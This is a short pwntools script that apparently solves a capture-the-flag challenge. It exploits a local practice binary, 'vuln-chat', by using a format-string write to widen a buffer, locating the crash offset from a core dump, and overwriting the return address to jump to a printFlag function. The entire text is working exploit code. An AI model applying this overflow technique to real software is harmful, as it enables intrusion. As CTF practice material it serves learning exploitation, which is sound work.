from pwn import *
context.binary = './vuln-chat'

io = process('./vuln-chat')

larger_format_payload = flat({
    cyclic_find("faaa") : b"%s"
})
io.sendline(larger_format_payload)
io.sendline(cyclic(500))
io.wait()

core = io.corefile
ret2flag_payload = flat({
    cyclic_find(core.fault_addr) : context.binary.symbols.printFlag
})
io = process('./vuln-chat')
larger_format_payload = flat({
    cyclic_find("faaa") : b"%s"
})
io.sendline(larger_format_payload)
io.sendline(ret2flag_payload)
io.interactive()
